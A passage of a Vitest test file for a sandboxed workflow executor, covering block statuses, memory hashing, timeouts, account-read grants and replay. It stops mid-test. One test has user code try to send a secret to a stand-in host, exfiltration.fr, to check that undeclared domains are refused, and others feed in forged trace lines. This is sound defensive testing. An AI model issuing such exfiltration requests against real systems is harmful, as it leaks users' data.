import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import dns from "node:dns";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { PassThrough } from "node:stream";
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import { PontFactice } from "../../src/mcp/pont-factice.js";
import {
  RUN_DELAY_MS,
  MEMORY_GAP_MS,
  PUBLICATIONS_GAP_MS,
  MEMORY_NOT_KEPT,
  PROFILE_DENIED,
  executerWorkflow,
  type WorkflowContext,
  type InfraWorkflow,
  type ProcessLauncher,
} from "../../src/workflows/executer.js";
import { SORTIE_MAX_OCTETS } from "../../src/workflows/executions.js";
import { SEARCHES_CAP, SEARCHES_STOPPED, TOO_MANY_READS, fetch } from "../../src/workflows/acces.js";
import { SEARCH_DENIED, UNREADABLE_RESULTS, extractResults, urlRecherche } from "../../src/workflows/duckduckgo.js";
import { Pacing } from "../../src/workflows/menagement.js";
import { WEB_REQUIRED } from "../../src/workflows/valider.js";
import { LIGNE_MAX_OCTETS, DATA_MAX_SIZE } from "../../src/workflows/protocole.js";
import { DATA_MAX_SIZE as TAILLE_MAX_DONNEES_ACCUEIL } from "../../src/accueil/schemas.js";
import { REPLAY_TOO_BIG } from "../../src/workflows/rejeu.js";
import { paramsHash, type BlocksMemory } from "../../src/workflows/memoire.js";
import { validateWorkflow } from "../../src/workflows/valider.js";
import { dossierTemporaire } from "../aide/temporaire.js";
import { Atelier } from "../../src/conteneur/atelier.js";
import { spacePaths } from "../../src/chemins.js";
import { streamingChain } from "../../src/workflows/chaine.js";
import { ACTION_STOPPED } from "../../src/workflows/executions.js";
import type { Owner } from "../../src/workflows/schema.js";
import type { DirectTrace } from "../../src/workflows/executer.js";

const MOTEUR = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(MOTEUR, "recolteur.mjs");
const MAINTENANT = new Date("2026-10-29T10:00:00.000Z");

const aFermer: { fermer(): Promise<void> }[] = [];
afterEach(async () => {
  await Promise.all(aFermer.splice(0).map((s) => s.fermer()));
});

async function serveurWeb(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requetes: string[] = [];
  const s: Server = createServer((req, res) => {
    requetes.push(req.url ?? "");
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const serveur = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  aFermer.push(serveur);
  return serveur;
}

const valide = (brut: unknown) => {
  const r = validateWorkflow(brut);
  if (!r.ok) throw new Error(r.erreur);
  return r.valide;
};

/** code (file `<id>.mjs`) → … → sortie, in a chain. */
const chaine = (...ids: string[]) => ({
  version: 1,
  blocs: [...ids.map((id) => ({ id, type: "code", parametres: { source: `${id}.mjs` } })), { id: "sortie", type: "sortie", parametres: { vers: "widget" } }],
  liens: [...ids, "sortie"].slice(1).map((vers, i) => ({ de: [...ids, "sortie"][i]!, vers })),
});

/** The owner as the bench records it: a widget's id (as before), `action:<id>` for an action. */
const nomDe = (p: string | Owner) => (typeof p === "string" ? p : p.type === "widget" ? p.id : `action:${p.id}`);

interface Banc {
  ctx: WorkflowContext;
  infra: InfraWorkflow;
  commandes: string[][];
  supprimes: string[];
  tues: number;
  refusEnCours: number;
}

/** A widget (files in a temporary folder) and a launcher that runs the harvester locally, without docker. */
async function banc(
  workflow: unknown,
  fichiers: Record<string, string> = {},
  o: { compte?: string[]; publiques?: string[]; accord?: { profil: string } | null; pont?: PontFactice; memoire?: BlocksMemory; delaiMs?: number; lancer?: ProcessLauncher } = {},
): Promise<Banc> {
  const dossier = await dossierTemporaire();
  for (const [nom, contenu] of Object.entries(fichiers)) await writeFile(join(dossier, nom), contenu);
  const b: Banc = {
    commandes: [],
    supprimes: [],
    tues: 0,
    refusEnCours: 0,
    ctx: {
      proprietaire: { type: "widget", id: "essai" },
      valide: valide(workflow),
      dossierFichiers: dossier,
      config: { interets: "rust" },
      precedent: null,
      memoire: o.memoire ?? {},
      sources: { compte: o.compte ?? [], publiques: o.publiques ?? [] },
      accord: async () => (o.accord === undefined ? null : o.accord),
      surProfilRefuse: async () => {
        b.refusEnCours++;
      },
      messageAccordRequis: "Accord requis pour lire avec ton compte : app.daily.dev",
      declencheur: "manuelle",
    },
    infra: {
      moteur: MOTEUR,
      atelier: {
        commandeRecolte: (p, d, m) => ["docker", "run", nomDe(p), d, m],
        supprimerRecolte: async (p) => {
          b.supprimes.push(nomDe(p));
        },
      },
      lancer:
        o.lancer ??
        ((cmd, args) => {
          b.commandes.push([cmd, ...args]);
          const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
          return {
            stdin: e.stdin,
            stdout: e.stdout,
            stderr: e.stderr,
            tuer: () => {
              b.tues++;
              e.kill("SIGKILL");
            },
            fin: new Promise((ok) => e.on("close", (c) => ok(c))),
          };
        }),
      ia: null,
      pont: o.pont ?? new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } }),
      horloge: () => MAINTENANT,
      delaiMs: o.delaiMs,
      adressesLocales: true,
    },
  };
  return b;
}

/** A fake process that writes these lines on stdout then exits with `code`. */
const lanceurScripte = (lignes: unknown[], code = 0): ProcessLauncher => () => {
  const stdout = new PassThrough();
  const stderr = new PassThrough();
  const stdin = new PassThrough();
  stdin.resume();
  const fin = new Promise<number | null>((ok) => {
    setImmediate(() => {
      for (const l of lignes) stdout.write((typeof l === "string" ? l : JSON.stringify(l)) + "\n");
      stdout.end();
      stderr.end();
      setImmediate(() => ok(code));
    });
  });
  return { stdin, stdout, stderr, tuer: () => {}, fin };
};

describe("executerWorkflow", () => {
  it("a code → sortie workflow returns fin with the value and a successful run block by block", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async (entree, w) => { w.journal("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [{ x: 1 }, { x: 2 }, { interets: "rust" }] }, memoire: {} });
    expect(r.execution).toMatchObject({
      version: 1,
      id: "2026-10-29T10-00-00-000Z",
      proprietaire: { type: "widget", id: "essai" },
      declencheur: "manuelle",
      debut: MAINTENANT.toISOString(),
      fin: MAINTENANT.toISOString(),
      statut: "reussie",
    });
    expect(r.execution.erreur).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "reussi", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: ["bonjour 2"] },
      { id: "sortie", type: "sortie", statut: "reussi", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: 3, sortie: [{ x: 1 }, { x: 2 }, { interets: "rust" }], journal: [] },
    ]);
    // The global log keeps what the code writes (stderr), as before workflows.
    expect(r.journal).toContain("bonjour 2");
    expect(b.commandes[0]).toEqual(["docker", "run", "essai", b.ctx.dossierFichiers, MOTEUR]);
    expect(b.supprimes).toEqual(["essai"]);
  });

  it("a container of the same name left by an abrupt stop is removed before launch", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default () => 1;` });
    const lancer = b.infra.lancer!;
    let avant: string[] = [];
    b.infra.lancer = (cmd, args) => ((avant = [...b.supprimes]), lancer(cmd, args));
    await executerWorkflow(b.ctx, b.infra);
    expect(avant).toEqual(["essai"]);
  });

  it("a partial block gives a partial run", async () => {
    const web = await serveurWeb({ "/a": (res) => res.end("contenu a") });
    const b = await banc(
      {
        version: 1,
        blocs: [
          { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
          { id: "lire", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
          { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
        ],
        liens: [{ de: "liste", vers: "lire" }, { de: "lire", vers: "sortie" }],
      },
      { "liste.mjs": `export default async () => [{ url: "${web.url}/a" }, { url: "${web.url}/absente" }];` },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue.t).toBe("fin");
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "partiel", "reussi"]);
    expect(r.execution.blocs[1]!.sortie).toEqual([{ url: `${web.url}/a`, contenu: "contenu a" }, { url: `${web.url}/absente` }]);
    expect(r.execution.blocs[1]!.journal.join("\n")).toMatch(/404/);
  });

  it("a failed block: outcome echec, failed run, following blocks pas-lance", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => { throw new Error("cassé : x"); };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "cassé : x", erreurDuCode: true });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.erreur).toBe("cassé : x");
    expect(r.execution.erreurNoyau).toBeUndefined();
    expect(r.execution.blocs).toEqual([
      { id: "a", type: "code", statut: "echoue", debut: MAINTENANT.toISOString(), fin: MAINTENANT.toISOString(), elements: null, erreur: "cassé : x", journal: [] },
      { id: "b", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
      { id: "sortie", type: "sortie", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
    ]);
  });

  it("the memory sent by the container comes back in the fin outcome", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const fichiers = { "liste.mjs": `export default async () => [{ url: "a" }, { url: "b" }];` };
    const premier = await banc(workflow, fichiers);
    const r1 = await executerWorkflow(premier.ctx, premier.infra);
    expect(r1.issue.t === "fin" && r1.issue.sortie.valeur).toEqual([{ url: "a" }, { url: "b" }]);
    const memoire = r1.issue.t === "fin" ? r1.issue.memoire : null;
    expect(memoire?.nouveaux?.type).toBe("liste.nouveaux");

    // The memory is sent back to the container: nothing new next time. An entry of another block does not pass.
    const second = await banc(workflow, fichiers, { memoire: { ...memoire!, ailleurs: { type: "liste.nouveaux", valeur: [] } } });
    const r2 = await executerWorkflow(second.ctx, second.infra);
    expect(r2.issue.t === "fin" && r2.issue.sortie.valeur).toEqual([]);
    expect(r2.issue.t === "fin" && Object.keys(r2.issue.memoire ?? {})).toEqual(["nouveaux"]);
  });

  it("a trace for an unknown or malformed block is ignored", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        l({ t: "bloc", id: "inconnu", etape: "fin", statut: "reussi", sortie: 1 });
        l({ t: "journal", bloc: "inconnu", texte: "x" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "bizarre" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        process.stdout.write("pas du json\\n");
        return 1;
      };`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.blocs.map((x) => x.id)).toEqual(["a", "sortie"]);
    expect(r.execution.blocs[1]).toMatchObject({ statut: "reussi", sortie: 1 });
  });

  it("a forged trace for a block that is not the next one does not count", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "b", etape: "debut" });
        l({ t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" });
        throw new Error("cassé");
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "echec", erreur: "cassé" });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
    expect(r.execution.blocs[1]!.sortie).toBeUndefined();
  });

  it("forged memory: only the workflow's blocks with their type, the last line before fin counts", async () => {
    const workflow = {
      version: 1,
      blocs: [
        { id: "amont", type: "code", parametres: { source: "amont.mjs" } },
        { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "amont", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
    };
    const b = await banc(workflow, {}, {
      lancer: lanceurScripte([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["premiere"] } } },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"] }, autre: { type: "liste.nouveaux", valeur: 1 }, sortie: { type: "code", valeur: 2 } } },
        { t: "memoire", memoire: "pas un objet" },
        { t: "fin", donnees: [] },
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["après fin"] } } },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [] }, memoire: { nouveaux: { type: "liste.nouveaux", valeur: ["x"], empreinte: paramsHash({ cle: "url" }) } } });
    // No block trace received: a block never started stays pas-lance.
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["pas-lance", "pas-lance", "pas-lance"]);
  });

  it("a memory over 3 MB is dropped with a note in the log", async () => {
    const b = await banc({ version: 1, blocs: [{ id: "amont", type: "code", parametres: { source: "amont.mjs" } }, { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "url" } }, { id: "sortie", type: "sortie" , parametres: { vers: "widget" } }], liens: [{ de: "amont", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }] }, {}, {
      lancer: lanceurScripte([
        { t: "memoire", memoire: { nouveaux: { type: "liste.nouveaux", valeur: "x".repeat(3.5 * 1024 * 1024) } } },
        { t: "fin", donnees: 1 },
      ]),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    expect(r.journal).toContain(MEMORY_NOT_KEPT);
    // Also in the run, in the output block's log.
    expect(r.execution.blocs.find((x) => x.id === "sortie")!.journal).toEqual([MEMORY_NOT_KEPT]);
  });

  it("a trace of a started block without an end gives it failed; block log bounded to 200 lines of 500 characters", async () => {
    const b = await banc(chaine("a"), {}, {
      lancer: lanceurScripte([
        { t: "bloc", id: "a", etape: "debut" },
        ...Array.from({ length: 250 }, (_, i) => ({ t: "journal", bloc: "a", texte: `${i} ${"y".repeat(800)}` })),
        { t: "echec", erreur: "arrêt" },
      ], 1),
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "echec", erreur: "arrêt", erreurDuCode: true });
    const a = r.execution.blocs[0]!;
    expect(a.statut).toBe("echoue");
    expect(a.journal).toHaveLength(200);
    expect(a.journal[0]).toMatch(/51 lignes coupées/);
    expect(a.journal[199]!.startsWith("249 ")).toBe(true);
    expect(a.journal.every((l) => l.length <= 500)).toBe(true);
    expect(r.execution.blocs[1]!.statut).toBe("pas-lance");
  });

  it("a 5 MB output (huge page) arrives truncated and marked, without stopping the run", async () => {
    const b = await banc(chaine("enorme", "moyenne", "court"), {
      "enorme.mjs": `export default async () => "x".repeat(5 * 1024 * 1024);`,
      "moyenne.mjs": `export default async (e) => e.slice(0, 1024 * 1024);`,
      "court.mjs": `export default async (e) => ({ longueur: e.length });`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: { longueur: 1024 * 1024 } } });
    expect(r.execution.statut).toBe("reussie");
    const [enorme, moyenne, court] = r.execution.blocs;
    expect(enorme).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(enorme!.sortie).toBeUndefined();
    expect(moyenne).toMatchObject({ statut: "reussi", sortieTronquee: true });
    expect(typeof moyenne!.sortie).toBe("string");
    expect(Buffer.byteLength(moyenne!.sortie as string)).toBeLessThanOrEqual(SORTIE_MAX_OCTETS);
    expect((moyenne!.sortie as string).startsWith('"xxx')).toBe(true);
    expect(court).toMatchObject({ statut: "reussi", sortie: { longueur: 1024 * 1024 } });
    expect(court!.sortieTronquee).toBeUndefined();
  });

  it("lirePage with an account without a grant: accord-requis stop", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: null, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(r.execution.blocs[0]!.statut).toBe("echoue");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
    expect(b.supprimes).toEqual(["essai", "essai"]);
  });

  it("ProfilRefuse: surProfilRefuse called, PROFIL_REFUSE stop", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], refuser: ["perso"] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(b.refusEnCours).toBe(1);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: PROFILE_DENIED });
    expect(r.execution.statut).toBe("accord-requis");
  });

  it("an early fin written by the code: partial run, following blocks pas-lance", async () => {
    const b = await banc(chaine("a", "b"), {
      "a.mjs": `export default async () => {
        process.stdout.write(JSON.stringify({ t: "fin", donnees: "tôt" }) + "\\n");
        await new Promise((ok) => setTimeout(ok, 50));
        process.exit(0);
      };`,
      "b.mjs": `export default async (e) => e;`,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "tôt" } });
    expect(r.execution.statut).toBe("partielle");
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance", "pas-lance"]);
  });

  it("grant removed between two reads with an account: accord-requis stop, no second read", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(
      chaine("a"),
      { "a.mjs": `export default async (e, w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); return w.lirePage("https://app.daily.dev/", { compte: true }); };` },
      { compte: ["app.daily.dev"], pont },
    );
    let lectures = 0;
    b.ctx.accord = async () => (lectures++ === 0 ? { profil: "perso" } : null);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(r.execution.statut).toBe("accord-requis");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(1);
    expect(b.supprimes).toEqual(["essai", "essai"]);
  });

  it("lirePage with an account and a grant: the bridge receives the profile and the declared domains", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [] }] } });
    const b = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;` }, { compte: ["app.daily.dev"], accord: { profil: "perso" }, pont });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "articles" } });
    expect(pont.appels.find((a) => a.methode === "lirePageInvisible")!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("lirePage with defiler: the bridge receives it (with or without an account); 0 passes nothing; outside 0 to 20, refused", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(
      chaine("a"),
      {
        "a.mjs": `const essai = (p) => p.then(() => "ok", (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.lirePage("https://app.daily.dev/a", { defiler: 8 })),
          await essai(w.lirePage("https://app.daily.dev/b", { compte: true, defiler: 2 })),
          await essai(w.lirePage("https://app.daily.dev/c", { defiler: 0 })),
          await essai(w.lirePage("https://app.daily.dev/d", { defiler: 21 })),
        ];`,
      },
      { compte: ["app.daily.dev"], publiques: ["app.daily.dev"], accord: { profil: "perso" }, pont },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: ["ok", "ok", "ok", "refus: Arguments invalides pour lirePage"] } });
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible").map((a) => a.args)).toEqual([
      ["https://app.daily.dev/a", { profil: null, domaines: ["app.daily.dev"], adressesLocales: true, defiler: 8 }],
      ["https://app.daily.dev/b", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true, defiler: 2 }],
      ["https://app.daily.dev/c", { profil: null, domaines: ["app.daily.dev"], adressesLocales: true }],
    ]);
  });

  it("recuperer to an undeclared domain for an owner with an account: refused", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [] } });
    const b = await banc(
      chaine("a"),
      {
        "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
        export default async (e, w) => [
          await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
          await essai(w.recuperer("http://localhost:${web.port}/")),
          await essai(w.lirePage("https://exfiltration.fr/")),
          await essai(w.recuperer("${web.url}/")),
        ];`,
      },
      { compte: ["app.daily.dev"], publiques: ["127.0.0.1"], accord: { profil: "perso" }, pont },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const [externe, autreNom, page, declare] = (r.issue.t === "fin" ? r.issue.sortie.valeur : []) as string[];
    expect(externe).toMatch(/^refus: .*non déclaré/);
    expect(autreNom).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(0);
  });

  it("timeout exceeded: in-flight AI calls are abandoned", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default (e, w) => Promise.all([w.kev("s", {}), w.gemma("p")]);` }, { delaiMs: 600 });
    const signaux: (AbortSignal | undefined)[] = [];
    b.infra.ia = {
      kev: (_c, o) => (signaux.push(o?.signal), new Promise(() => {})),
      gemma: (g) => (signaux.push(g.signal), new Promise(() => {})),
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "arret", erreur: "Délai dépassé" });
    expect(signaux).toHaveLength(2);
    expect(signaux.every((s) => s?.aborted)).toBe(true);
  });

  it("timeout exceeded: « Délai dépassé » stop and container removed", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default () => new Promise(() => {});` }, { delaiMs: 600 });
    const debut = Date.now();
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(Date.now() - debut).toBeLessThan(5000);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    expect(r.execution).toMatchObject({ statut: "echouee", erreur: "Délai dépassé", erreurNoyau: true });
    expect(r.execution.blocs.map((x) => x.statut)).toEqual(["echoue", "pas-lance"]);
    expect(b.tues).toBeGreaterThan(0);
    expect(b.supprimes).toEqual(["essai", "essai"]);
    expect(RUN_DELAY_MS).toBe(200_000);
  });

  it("the debut carries the validated workflow and the config; the memory follows", async () => {
    const recu: string[] = [];
    const b = await banc(chaine("a"), {}, {
      lancer: () => {
        const p = lanceurScripte([{ t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
        return p;
      },
      memoire: { a: { type: "code", valeur: 1 } },
    });
    b.ctx.precedent = { ancien: true };
    await executerWorkflow(b.ctx, b.infra);
    const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
    expect(lignes[0]).toEqual({
      t: "debut",
      precedent: { ancien: true },
      maintenant: MAINTENANT.toISOString(),
      config: { interets: "rust" },
      workflow: { blocs: b.ctx.valide.workflow.blocs, liens: b.ctx.valide.workflow.liens, ordre: ["a", "sortie"] },
    });
    expect(lignes[1]).toEqual({ t: "memoire", memoire: { a: { type: "code", valeur: 1 } } });
  });

  /** The lines the container receives (start, memory) and the returned memory, for a workflow `a` → `sortie`. */
  async function memoireVueParLeConteneur(workflow: unknown, memoire: BlocksMemory, rendue: BlocksMemory = {}) {
    const recu: string[] = [];
    const b = await banc(workflow, {}, {
      lancer: () => {
        const p = lanceurScripte([{ t: "memoire", memoire: rendue }, { t: "fin", donnees: null }])("", []);
        p.stdin.on("data", (d: Buffer) => recu.push(d.toString()));
        return p;
      },
      memoire,
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    const lignes = recu.join("").trim().split("\n").map((l) => JSON.parse(l));
    return { envoyee: lignes[1].memoire as BlocksMemory, rendue: r.issue.t === "fin" ? r.issue.memoire : null, ctx: b.ctx };
  }

  it("a memory whose hash no longer matches the parameters is not sent to the container", async () => {
    const wf = (cle: string) => ({
      version: 1,
      blocs: [
        { id: "a", type: "code", parametres: { source: "a.mjs" } },
        { id: "n", type: "liste.nouveaux", parametres: { cle } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "a", vers: "n" }, { de: "n", vers: "sortie" }],
    });
    const memoire: BlocksMemory = {
      n: { type: "liste.nouveaux", valeur: ["x"], empreinte: paramsHash({ cle: "url" }) },
      a: { type: "code", valeur: 1 }, // old memory without a hash: accepted once
    };
    const memes = await memoireVueParLeConteneur(wf("url"), memoire);
    expect(memes.envoyee).toEqual({ n: { type: "liste.nouveaux", valeur: ["x"] }, a: { type: "code", valeur: 1 } }); // without the hash
    const autres = await memoireVueParLeConteneur(wf("titre"), memoire);
    expect(autres.envoyee).toEqual({ a: { type: "code", valeur: 1 } });
  });

  it("the returned memory is marked with the hash of the run's parameters, even if workflow.json changed meanwhile", async () => {
    // The run never reads workflow.json: it receives ctx.valide, validated at the start. A file rewritten during
    // the run therefore changes nothing about what is marked; the new settings do not find this memory.
    const wf = (cle: string) => ({
      version: 1,
      blocs: [
        { id: "a", type: "code", parametres: { source: "a.mjs" } },
        { id: "n", type: "liste.nouveaux", parametres: { cle } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "a", vers: "n" }, { de: "n", vers: "sortie" }],
    });
    const premiere = await memoireVueParLeConteneur(wf("url"), {}, { n: { type: "liste.nouveaux", valeur: ["vu"] } });
    expect(premiere.rendue).toEqual({ n: { type: "liste.nouveaux", valeur: ["vu"], empreinte: paramsHash({ cle: "url" }) } });
    // workflow.json changed (cle: titre): the second run receives an empty memory for this block.
    const seconde = await memoireVueParLeConteneur(wf("titre"), premiere.rendue!);
    expect(seconde.envoyee).toEqual({});
  });

  describe("trials (replay from a block)", () => {
    const T = MAINTENANT.toISOString();
    /** a → b → c → sortie: replay from c, b reused (2 elements), a neither relaunched nor reused. */
    const rejeuDepuisC = { relances: ["c", "sortie"], sorties: { b: [{ x: 1 }, { x: 2 }] }, repris: { b: 2 } };

    it("a trial returns a run with repris, pas-lance and the relaunched blocks", async () => {
      const b = await banc(chaine("a", "b", "c"), {
        "a.mjs": `export default async () => { throw new Error("a lancé"); };`,
        "b.mjs": `export default async () => { throw new Error("b lancé"); };`,
        "c.mjs": `export default async (entree) => entree.map((e) => e.x * 10);`,
      });
      b.ctx.declencheur = "rejeu";
      b.ctx.rejeu = rejeuDepuisC;
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "fin", sortie: { vers: "widget", valeur: [10, 20] }, memoire: null });
      expect(r.execution.statut).toBe("reussie");
      expect(r.execution.declencheur).toBe("rejeu");
      expect(r.execution.blocs).toEqual([
        { id: "a", type: "code", statut: "pas-lance", debut: null, fin: null, elements: null, journal: [] },
        { id: "b", type: "code", statut: "repris", debut: null, fin: null, elements: 2, journal: [] },
        { id: "c", type: "code", statut: "reussi", debut: T, fin: T, elements: 2, sortie: [10, 20], journal: [] },
        { id: "sortie", type: "sortie", statut: "reussi", debut: T, fin: T, elements: 2, sortie: [10, 20], journal: [] },
      ]);
    });

    it("a trial: the status counts only the relaunched blocks, and lines forged for a reused or non-relaunched block are rejected", async () => {
      const b = await banc(chaine("a", "b", "c"), {}, {
        lancer: lanceurScripte([
          { t: "bloc", id: "b", etape: "debut" },
          { t: "journal", bloc: "b", texte: "forgé" },
          { t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" },
          { t: "journal", bloc: "a", texte: "forgé" },
          { t: "bloc", id: "c", etape: "debut" },
          { t: "bloc", id: "c", etape: "fin", statut: "reussi", sortie: [1] },
          { t: "bloc", id: "a", etape: "debut" },
          { t: "bloc", id: "sortie", etape: "debut" },
          { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [1] },
          { t: "fin", donnees: [1] },
        ]),
      });
      b.ctx.rejeu = rejeuDepuisC;
      const relayees: unknown[] = [];
